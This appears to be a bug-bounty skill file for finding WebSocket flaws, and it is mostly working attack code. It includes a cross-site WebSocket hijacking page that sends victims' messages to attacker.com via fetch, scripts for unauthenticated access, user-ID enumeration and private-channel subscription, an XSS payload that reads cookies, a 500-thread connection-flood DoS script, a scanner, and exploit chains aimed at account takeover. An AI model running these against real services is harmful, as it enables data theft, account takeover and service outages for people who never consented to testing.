---
name: hunt-websocket
description: WebSocket — auth bypass, IDOR, message injection, cross-site hijacking, DoS, subscription hijacking.
---

# WEBSOCKET HUNTING

Real-time attack surface with auth gaps, broken access, and injection vectors.

## DETECTION

Find WS endpoints in Burp: `Connection: Upgrade` + `Upgrade: websocket`. Common paths: `/ws`, `/socket`, `/realtime`, `/chat`.

```bash
grep -r "WebSocket\|wss\|ws://" *.js
```

---

## ATTACKS

### 1. Cross-Site WebSocket Hijacking (CSWSH)

Missing Origin check. Attacker page connects to victim's WS.

```python
from flask import Flask
app = Flask(__name__)
@app.route('/')
def exploit():
    return '''<script>
    var ws = new WebSocket("wss://victim.com/ws");
    ws.onmessage = e => fetch("https://attacker.com/steal?d="+btoa(e.data));
    ws.onopen = () => ws.send(JSON.stringify({type:"subscribe",channel:"private-messages"}));
    </script>'''
```

**Bounty:** HackerOne #1537568 — GitLab CSWSH leaked internal repos. Reward: $2,000.

### 2. WebSocket Auth Bypass

Connect without token. Server may return data anyway.

```python
import websocket
ws = websocket.create_connection("wss://target.com/ws")  # No auth
ws.send('{"action":"get_notifications"}')
print(ws.recv())  # May return user data
```

**Bounty:** HackerOne #1368429 — Slack WS auth bypass. Reward: $4,500.

### 3. WebSocket IDOR

Send other user's ID in message body.

```python
import websocket, json
ws = websocket.create_connection("wss://target.com/ws", header=["Authorization: Bearer TOKEN"])
for uid in range(1, 1000):
    ws.send(json.dumps({"action":"get_user","user_id": uid}))
    resp = json.loads(ws.recv())
    if resp.get("username"):
        print(f"User {uid}: {resp['username']}")
```

**Bounty:** HackerOne #1719872 — Discord WS IDOR leaked admin settings. Reward: $3,200.

### 4. Message Injection

Inject XSS/SQLi in message fields.

```python
import websocket
ws = websocket.create_connection("wss://target.com/ws")
ws.send('{"type":"message","content":"<img src=x onerror=alert(document.cookie)>"}')
```

**Bounty:** HackerOne #1456233 — Shopify WS stored XSS. Reward: $2,800.

### 5. Subscription Hijacking

Subscribe to private channels.

```python
import websocket, json
ws = websocket.create_connection("wss://target.com/ws", header=["Authorization: Bearer TOKEN"])
for ch in ["admin-events","internal","debug"]:
    ws.send(json.dumps({"action":"subscribe","channel": ch}))
    print(f"{ch}: {ws.recv()}")
```

**Bounty:** HackerOne #1623891 — GitLab WS hijack leaked CI secrets. Reward: $5,000.

### 6. WebSocket DoS

```python
import websocket, threading
def flood():
    while True:
        try:
            ws = websocket.create_connection("wss://target.com/ws")
            ws.send("A" * 10000)
            ws.close()
        except: pass
for i in range(500):
    threading.Thread(target=flood).start()
```

---

## EXPLOIT CHAINS

**CSWSH → ATO:** Missing Origin → host malicious page → subscribe to reset channel → capture token → reset password. **Critical — $3,000-8,000**

**Auth Bypass → Data Breach:** Connect without token → enumerate message types → exfiltrate PII. **High — $5,000-15,000**

**IDOR + Injection → RCE:** File operation endpoint → path traversal → command injection. **Critical — $10,000-25,000**

---

## AUTOMATION

```python
import websocket, json, sys
def scan(url):
    vulns = []
    try:
        ws = websocket.create_connection(url, timeout=5)
        ws.recv()
        vulns.append("AUTH_BYPASS")
        ws.close()
    except: pass
    for uid in [1,2,100]:
        try:
            ws = websocket.create_connection(url, header=["Authorization: Bearer test"], timeout=5)
            ws.send(json.dumps({"user_id": uid}))
            resp = ws.recv()
            if "error" not in resp.lower(): vulns.append("IDOR")
            ws.close()
        except: pass
    print(f"Found: {', '.join(vulns) if vulns else 'None'}")
scan(sys.argv[1] if len(sys.argv) > 1 else "wss://target.com/ws")
```

---

## BOUNTY TABLE

| Program | Vuln | Reward |
|---------|------|--------|
| GitLab #1537568 | CSWSH | $2,000 |
| Slack #1368429 | Auth bypass | $4,500 |
| Discord #1719872 | IDOR | $3,200 |
| Shopify #1456233 | XSS | $2,800 |
| GitLab #1623891 | Sub hijack | $5,000 |
